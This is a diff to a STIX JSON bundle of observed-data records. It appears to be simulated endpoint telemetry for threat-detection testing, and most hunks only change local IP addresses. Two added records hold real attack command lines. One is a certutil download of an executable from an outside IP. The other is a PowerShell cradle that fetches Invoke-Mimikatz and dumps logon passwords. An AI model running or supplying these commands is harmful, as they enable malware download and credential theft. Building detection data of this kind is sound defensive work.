@@ -57,7 +57,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.2"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -123,7 +123,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.5"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -189,7 +189,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -255,7 +255,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -321,7 +321,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -387,7 +387,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -519,7 +519,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -585,7 +585,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -651,7 +651,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.7"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -1971,7 +1971,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.5"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -2301,7 +2301,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.9"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -3291,7 +3291,7 @@
                 },
                 "5": {
                     "type": "ipv4-addr",
-                    "value": "192.168.0.5"
+                    "value": "192.168.0.8"
                 },
                 "6": {
                     "dst_ref": "5",
@@ -10372,6 +10372,72 @@
             "type": "observed-data"
         },
         {
+            "created": "2019-10-03T14:53:36Z",
+            "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
+            "first_observed": "2019-10-03T14:53:35Z",
+            "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31719",
+            "last_observed": "2019-10-03T14:53:35Z",
+            "modified": "2019-10-03T14:53:35Z",
+            "number_observed": 1,
+            "objects": {
+                "0": {
+                    "hashes": {
+                        "MD5": "7B973145F7E1B59330CA4DD1F86B3D55"
+                    },
+                    "name": "certutil.exe",
+                    "type": "exe"
+                },
+                "1": {
+                    "binary_ref": "0",
+                    "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
+                    "created": "2019-10-03T14:53:35Z",
+                    "creator_user_ref": "0x46d94",
+                    "name": "certutil.exe",
+                    "opened_connection_refs": [
+                        "1"
+                    ],
+                    "parent_ref": "3",
+                    "pid": 744,
+                    "type": "process"
+                },
+                "2": {
+                    "hashes": {
+                        "MD5": "00000000000000000000000000000000"
+                    },
+                    "name": "cmd.exe",
+                    "type": "file"
+                },
+                "3": {
+                    "binary_ref": "2",
+                    "name": "cmd.exe",
+                    "pid": 1668,
+                    "type": "process"
+                },
+                "4": {
+                    "type": "domain-name",
+                    "value": "workstation"
+                },
+                "5": {
+                    "type": "ipv4-addr",
+                    "value": "192.168.0.5"
+                },
+                "6": {
+                    "dst_ref": "5",
+                    "src_ref": "7",
+                    "type": "network-traffic"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "180.33.14.3"
+                },
+                "8": {
+                    "type": "user-account",
+                    "user_id": "SYSTEM"
+                }
+            },
+            "type": "observed-data"
+        },
+        {
             "created": "2019-10-03T14:53:35Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
             "first_observed": "2019-10-03T14:53:35Z",
@@ -10552,6 +10618,72 @@
                 "5": {
                     "type": "ipv4-addr",
                     "value": "192.168.0.8"
+                },
+                "6": {
+                    "dst_ref": "5",
+                    "src_ref": "7",
+                    "type": "network-traffic"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": ""
+                },
+                "8": {
+                    "type": "user-account",
+                    "user_id": "SYSTEM"
+                }
+            },
+            "type": "observed-data"
+        },
+        {
+            "created": "2019-10-03T14:51:36Z",
+            "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
+            "first_observed": "2019-10-03T14:53:35Z",
+            "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31720",
+            "last_observed": "2019-10-03T14:53:35Z",
+            "modified": "2019-10-03T14:53:35Z",
+            "number_observed": 1,
+            "objects": {
+                "0": {
+                    "hashes": {
+                        "MD5": "EB32C070E658937AA9FA9F3AE629B2B8"
+                    },
+                    "name": "powershell.exe",
+                    "type": "exe"
+                },
+                "1": {
+                    "binary_ref": "0",
+                    "command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\"",
+                    "created": "2019-10-03T14:53:35Z",
+                    "creator_user_ref": "0x46d94",
+                    "name": "powershell.exe",
+                    "opened_connection_refs": [
+                        "1"
+                    ],
+                    "parent_ref": "3",
+                    "pid": 2252,
+                    "type": "process"
+                },
+                "2": {
+                    "hashes": {
+                        "MD5": "00000000000000000000000000000000"
+                    },
+                    "name": "cmd.exe",
+                    "type": "file"
+                },
+                "3": {
+                    "binary_ref": "2",
+                    "name": "cmd.exe",
+                    "pid": 1668,
+                    "type": "process"
+                },
+                "4": {
+                    "type": "domain-name",
+                    "value": "workstation"
+                },
+                "5": {
+                    "type": "ipv4-addr",
+                    "value": "192.168.0.2"
                 },
                 "6": {
                     "dst_ref": "5",
